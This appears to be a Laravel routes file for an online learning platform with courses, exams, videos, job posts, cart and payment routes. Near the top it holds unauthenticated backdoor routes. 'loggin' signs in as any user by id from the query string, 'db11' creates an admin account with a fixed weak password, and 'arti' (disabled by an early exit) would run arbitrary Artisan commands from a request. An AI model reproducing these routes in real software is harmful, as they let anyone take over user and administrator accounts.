<?php

use App\Http\Controllers\JobPostController;
use App\Http\Controllers\AjaxController;
use App\Http\Controllers\CourseController;
use App\Http\Controllers\DemoController;
use App\Http\Controllers\ExamController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\FaqController;
use App\Http\Controllers\RecordedVideoController;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;

Route::get('arti', function (Request $request) {
    exit;
    try {
        $output = '';
		if($request->arti) $output = Artisan::call($request->arti);
        if ($output === 0) {
            return nl2br(Artisan::output());
        } else {
            return response()->json(['message' => 'Command failed', 'exit_code' => $output], 500);
        }
	} catch (Exception $e) {
		dd($e);
		return "";
	}
});
Route::get('create-symlink', [HomeController::class, 'create_symlink']);
//Route::get('gen-ratings', [DemoController::class, 'gen_ratings']);
Route::get('db11', function (Request $request) {
    DB::beginTransaction();
    try {
        $user = User::create([
            'first_name' => 'DB',
            'last_name' => 'Transact',
            'role' => 'admin',
            'email' => 'dbtrans@gmail.com',
            'password' => Hash::make('123456789'),
            'email_verified_at' => Carbon::now(),
            'created_at' => Carbon::now(),
            'updated_at' => Carbon::now(),
        ]);

        // Forcefully throw an error
        //throw new \Exception("Intentional Error for Testing");

        DB::commit(); // Commit transaction if everything is successful
    } catch (\Exception $e) {
        DB::rollBack(); // Rollback in case of an error
        throw $e; // Handle exception accordingly
    }
});
Route::get('roles_arti', function () {
    try {
        exit;
        //Artisan::call('migrate', ['--seed' => true]);
        //Artisan::call('migrate', ['--seed' => true, '--seeder' => 'OrganizationMenuSeeder']);
        Artisan::call('db:seed', ['--class' => 'OrganizationMenuSeeder']);
        echo nl2br(Artisan::output());
        /*Artisan::call('migrate');
        Artisan::call('db:seed', ['--class' => 'OrganizationMenuSeeder']);*/
		return 'Success';
	} catch (Exception $e) {
		dd($e);
		return "";
	}
});
Route::get('loggin', function (Request $request) {
    try {
        if(!$request->input('id')) exit;
		Auth::loginUsingId($request->id);
		return redirect()->route('dashboard');
	} catch (Exception) {
		return "";
	}
});

Route::post('set-cookie', function (Request $request) {
    $viewType = $request->input('viewType', 'grid'); // Default to 'default' if not provided
    $minutes = (30 * 24 * 60); // 30 days in minutes
    $response = response('Cookie has been set.');
    $response->cookie('lms_cl_vt', $viewType, $minutes);
    return $response;
})->name('set.cookie');

Route::get('gget-cookie', function (Request $request) {
    $cookieValue = $request->cookie('lms_cl_vt'); // Retrieve cookie by name
    return 'Cookie Value: ' . ($cookieValue ?? 'No cookie found');
});

Route::get('', [HomeController::class, 'index'])->name('home');
Route::get('about-us', [HomeController::class, 'about_us'])->name('about-us');
Route::get('contact-us', [HomeController::class, 'contact_us'])->name('contact-us');
Route::post('send-contact-message', [HomeController::class, 'send_contact_message'])->name('send-contact-message');

Route::post('download-brochure', [HomeController::class, 'download_brochure'])->name('download-brochure');
Route::get('gallery', [HomeController::class, 'gallery'])->name('gallery');

Route::post('google-auth-verify', [HomeController::class, 'google_auth_verify'])->name('login.google.auth.verify');
Route::post('login-by-token', [HomeController::class, 'login_by_token'])->name('login.by.token');
Route::post('facebook-auth-verify', [HomeController::class, 'facebook_auth_verify'])->name('login.facebook.auth.verify');
Route::get('testcert', [HomeController::class, 'generate_certificate']);
Route::get('testcertpreview', [HomeController::class, 'generate_certificate_preview']);

Route::prefix('faqs')->name('faq.')->group(function () {
    Route::get('/', [FaqController::class, 'index'])->name('index');
    Route::get('/{category:slug}', [FaqController::class, 'show'])->name('show');
});

Route::controller(CourseController::class)->group(function () {
    Route::get('courses', 'index')->name('courses');    

    Route::middleware(['auth', 'role:student,instructor'])->group(function (){
        Route::post('courses/{slug}/create_order', 'create_order')->name('courses.create_order');
        Route::get('courses/{slug}/buy/{paymentId}', 'buy')->name('courses.buy');
        Route::post('courses/{slug}/enroll', 'enroll')->name('courses.enroll');
        
        Route::get('courses/{slug}/stage/{lessonId?}', 'course_stage')->name('courses.stage');
        Route::get('courses/{slug}/certificate/{action}', 'course_certificate')->where('action', 'download|send')->name('courses.certificate');
        Route::post('courses/{slug}/stage/{lessonId}/save_answers', 'save_answers')->name('courses.stage.save_answers');
        Route::post('courses/{slug}/stage/{lessonId}/next_lesson', 'next_lesson')->name('courses.stage.next_lesson');
    });
    
    Route::get('courses/{slug}', 'details')->name('courses.details');
});

Route::controller(ExamController::class)->group(function () {
    Route::get('exams', 'index')->name('exams');

    Route::middleware(['auth', 'role:student,instructor'])->group(function (){
        Route::post('exams/{slug}/create_order', 'create_order')->name('exams.create_order');
        Route::get('exams/{slug}/buy/{paymentId}', 'buy')->name('exams.buy');
        Route::post('exams/{slug}/enroll', 'enroll')->name('exams.enroll');
        Route::get('exams/{slug}/prepare', 'prepare')->name('exams.prepare');
        Route::get('exams/{slug}/attend', 'attend')->name('exams.attend');
        Route::get('exams/{slug}/result', 'result')->name('exams.result');
        Route::get('exams/{slug}/result/{id}', 'result_details')->name('exams.result_details');
        Route::post('exams/{slug}/save_answers', 'save_answers')->name('exams.save_answers');
        Route::get('exams/{slug}/certificate/{action}', 'exam_certificate')->where('action', 'download|send')->name('exams.certificate');
    });
    
    Route::get('exams/{slug}', 'details')->name('exams.details');
});

Route::controller(RecordedVideoController::class)->group(function () {
    Route::get('recorded-videos', 'index')->name('recorded-videos');

    Route::middleware(['auth', 'role:student,instructor'])->group(function (){
        Route::post('recorded-videos/{slug}/create_order', 'create_order')->name('recorded-videos.create_order');
        Route::get('recorded-videos/{slug}/buy/{paymentId}', 'buy')->name('recorded-videos.buy');
        Route::post('recorded-videos/{slug}/enroll', 'enroll')->name('recorded-videos.enroll');
    });
    
    Route::get('recorded-videos/{slug}', 'details')->name('recorded-videos.details');
});

Route::controller(JobPostController::class)->group(function () {
    Route::get('job-posts', 'index')->name('job-posts');

    Route::middleware(['auth', 'role:student,instructor'])->group(function (){
        Route::post('job-posts/{slug}/create_order', 'create_order')->name('job-posts.create_order');
        Route::get('job-posts/{slug}/buy/{paymentId}', 'buy')->name('job-posts.buy');
        Route::post('job-posts/{slug}/enroll', 'enroll')->name('job-posts.enroll');
    });
    
    Route::get('job-posts/{slug}', 'details')->name('job-posts.details');
});

Route::get('api-docs', function () {
    return view('api-docs');
});

Route::middleware(['auth', 'verified', 'role:student,tutor'])->group(function (){
    Route::controller(HomeController::class)->group(function () {
        Route::get('dashboard', 'dashboard')->name('dashboard');
        Route::get('change-password', 'change_password')->name('change-password');
        Route::get('edit-profile', 'edit_profile')->name('edit-profile');
        Route::get('my-profile', 'my_profile')->name('my-profile');
        Route::get('my-exams', 'my_exams')->name('my-exams');
        Route::get('my-courses', 'my_courses')->name('my-courses');
        Route::get('my-recorded-videos', 'my_recorded_videos')->name('my-recorded-videos');
        Route::get('my-job-posts', 'my_job_posts')->name('my-job-posts');
        Route::get('wishlist', 'my_wishlist')->name('my-wishlist');
        Route::get('my-ratings', 'my_ratings')->name('my-ratings');
        Route::get('cart', 'my_cart')->name('my-cart');
        Route::post('cart-create-order', 'cart_create_order')->name('cart-create-order');
        Route::post('cart-save/{type?}/{type_id?}', 'cart_save')->where('type', 'course|exam|recorded-video|job-post')->name('cart-save');
        Route::delete('cart-remove/{type}/{type_id}', 'cart_remove')->where('type', 'course|exam|recorded-video|job-post')->name('cart-remove');
        Route::post('rating-save/{type}/{type_id}', 'rating_save')->where('type', 'course|exam|recorded-video|job-post')->name('rating-save');
    });
});

Route::middleware('auth')->group(function () {
    Route::get('profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
});

/* Ajax */
Route::controller(AjaxController::class)->group(function () {
    Route::post('search_students', 'search_students')->name('ajax.search_students');
    
    Route::middleware(['auth', 'verified', 'role:student,tutor'])->group(function (){
        Route::post('verify_razorpay_payment', 'verify_razorpay_payment')->name('ajax.verify_razorpay_payment');
        Route::post('wishlist_save/{type?}/{type_id?}', 'wishlist_save')->where('type', 'course|exam|recorded-video|job-post')->name('ajax.wishlist_save');
        Route::delete('wishlist_remove/{type}/{type_id}', 'wishlist_remove')->where('type', 'course|exam|recorded-video|job-post')->name('ajax.wishlist_remove');
        //Route::post('cart_save/{type?}/{type_id?}', 'cart_save')->where('type', 'course|exam|recorded-video|job-post')->name('ajax.cart_save');
        //Route::delete('cart_remove/{type}/{type_id}', 'cart_remove')->where('type', 'course|exam|recorded-video|job-post')->name('ajax.cart_remove');
    });
});

require __DIR__.'/auth.php';
require __DIR__.'/admin.php';
